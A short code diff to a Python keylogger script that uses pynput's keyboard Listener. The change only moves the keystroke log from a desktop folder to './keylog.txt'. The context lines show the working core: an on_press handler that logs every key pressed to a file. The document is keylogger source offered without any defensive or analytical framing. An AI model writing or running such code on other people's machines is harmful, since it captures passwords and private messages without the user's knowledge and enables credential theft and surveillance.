@@ -2,7 +2,7 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-logging.basicConfig(filename=("X:/Bureau/keylog.txt"), level=logging.INFO, format='%(message)s')
+logging.basicConfig(filename=("./keylog.txt"), level=logging.INFO, format='%(message)s')
 
 def on_press(key):
     logging.info(key)
